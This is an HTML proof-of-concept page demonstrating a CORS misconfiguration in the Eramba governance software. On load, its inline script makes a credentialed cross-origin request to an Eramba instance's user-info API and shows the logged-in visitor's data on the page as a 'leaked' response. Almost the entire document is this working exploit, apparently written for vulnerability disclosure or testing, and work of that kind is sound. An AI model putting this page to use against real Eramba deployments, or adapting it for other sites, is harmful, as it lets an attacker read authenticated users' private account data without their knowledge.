<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Eramba CORS Exploit PoC</title>
  <style>
    body {
      font-family: monospace;
      background: #0f172a;
      color: #e5e7eb;
      padding: 20px;
    }
    h1 {
      color: #38bdf8;
    }
    pre {
      background: #020617;
      padding: 15px;
      border-radius: 6px;
      overflow-x: auto;
      white-space: pre-wrap;
      word-break: break-word;
    }
    .ok {
      color: #22c55e;
    }
    .err {
      color: #ef4444;
    }
  </style>
</head>
<body>

<h1>Eramba CORS Misconfiguration – Live PoC</h1>

<p>
If you are <strong>logged into Eramba</strong> and simply visit this page,
your authenticated data will be fetched cross-origin.
</p>

<h3>Status:</h3>
<div id="status">Sending request…</div>

<h3>Leaked API Response:</h3>
<pre id="output">Waiting…</pre>

<script>
(async () => {
  try {
    const response = await fetch(
      "https://172.29.119.134:8443/system-api/users/info",
      {
        method: "GET",
        credentials: "include"
      }
    );

    const text = await response.text();

    document.getElementById("status").innerHTML =
      "<span class='ok'>✔ Request succeeded from attacker origin</span>";

    document.getElementById("output").textContent = text;

  } catch (e) {
    document.getElementById("status").innerHTML =
      "<span class='err'>✘ Request failed</span>";
    document.getElementById("output").textContent = e.toString();
  }
})();
</script>

</body>
</html>
